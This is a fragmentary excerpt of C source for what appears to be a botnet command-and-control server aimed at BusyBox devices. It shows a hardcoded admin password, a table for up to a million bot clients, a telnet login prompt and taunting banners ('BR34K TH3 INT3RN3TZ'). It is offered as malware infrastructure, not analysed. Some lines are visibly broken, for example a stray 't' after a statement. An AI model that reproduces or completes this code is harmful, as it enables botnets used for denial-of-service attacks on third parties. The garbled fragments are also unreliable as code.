...
//Admin-Config
#define MY_MGM_ADMINP "7%jIaKK%W)q!LgG@A]"
#define MY_MGM_PORT  911

#define MAXFDS 1000000 
char MY_USER_ADMIN=0;
struct clientdata_t {
        uint32_t ip;
        char connected;
} clients[MAXFDS];
...
if(send(thefd, "\x1b[32mNickname:\x1b[30m \033[0m", 32, MSG_NOSIGNAL) == -1) goto end;
if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
trim(buf);
nickstring = ("%s", buf);
if(strcmp(nickstring, MY_MGM_ADMINU) == 0){
if(send(thefd, "\x1b[32m*           VALID CREDENTIALS           *\r\n\033[0m", 60, MSG_NOSIGNAL) == -1) goto end;
if(send(thefd, "\x1b[32mPassword:\x1b[30m \033[0m", 33, MSG_NOSIGNAL) == -1) goto end;
if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
trim(buf);
...
fak:
        ...
        if(send(thefd, "*        BR34K TH3 INT3RN3TZ                     *\r\n", 54, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "*          BuSy BoX MuSlUm          *\r\n", 25, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "*****************************************\r\n\r\n> \x1b[0m \033[0m", 66, MSG_NOSIGNAL) == -1) goto end;
...
int main (int argc, char *argv[])
{
        ...
        s = make_socket_non_blocking (listenFD);t
        if (s == -1) abort ();
